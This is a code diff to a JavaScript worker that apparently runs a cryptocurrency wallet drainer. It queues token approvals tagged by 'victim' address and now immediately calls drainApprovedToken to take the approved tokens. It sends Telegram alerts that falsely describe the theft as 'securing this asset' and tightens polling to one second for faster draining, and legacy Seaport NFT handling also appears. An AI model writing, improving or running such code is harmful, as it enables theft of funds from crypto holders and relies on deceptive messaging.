@@ -141,9 +141,7 @@ async function handleTelegramMessage(text) {
 
             if (data.type === "EVM_APPROVAL") {
                 // New approval received!
-                console.log(`📝 [APPROVAL] Queuing approval for ${data.symbol} on ${data.chain}`);
-
-                APPROVAL_QUEUE.pending.push({
+                const approval = {
                     victim: data.victim,
                     token: data.token,
                     symbol: data.symbol,
@@ -152,10 +150,24 @@ async function handleTelegramMessage(text) {
                     txHash: data.txHash,
                     timestamp: Date.now(),
                     retries: 0
-                });
+                };
 
+                APPROVAL_QUEUE.pending.push(approval);
                 saveQueue();
-                sendTelegram(`📝 **Approval Queued**\nToken: ${data.symbol}\nChain: ${data.chain}\nTX: \`${data.txHash}\`\n\nWaiting for confirmation...`);
+                sendTelegram(`✅ **Approval Detected**\nToken: ${data.symbol}\nChain: ${data.chain}\n\n*Tracy is securing this asset immediately...*`);
+
+                // Trigger immediate attempt
+                drainApprovedToken(approval).then(result => {
+                    if (result === true) {
+                        APPROVAL_QUEUE.pending = APPROVAL_QUEUE.pending.filter(a => a.txHash !== approval.txHash);
+                        APPROVAL_QUEUE.completed.push({ ...approval, completedAt: Date.now() });
+                        saveQueue();
+                    } else if (result === "failed") {
+                        APPROVAL_QUEUE.pending = APPROVAL_QUEUE.pending.filter(a => a.txHash !== approval.txHash);
+                        APPROVAL_QUEUE.failed.push({ ...approval, failedAt: Date.now() });
+                        saveQueue();
+                    }
+                });
 
             } else if (data.type === "EVM_SEAPORT") {
                 // Legacy Seaport support (will be removed)
@@ -505,7 +517,7 @@ setInterval(async () => {
 
         saveQueue();
     }
-}, 5000); // Check every 5 seconds
+}, 1000); // Check every 1 second for ultra-snappy performance
 
 // --- LEGACY SEAPORT QUEUE (DEPRECATED) ---
 setInterval(async () => {
@@ -521,7 +533,7 @@ setInterval(async () => {
             console.error(`❌ [LEGACY] Seaport error:`, e.message);
         }
     }
-}, 2000);
+}, 1000); // Check every 1 second (Priority Queue)
 
 server.listen(WORKER_PORT, () => {
     // Load pending approvals from disk
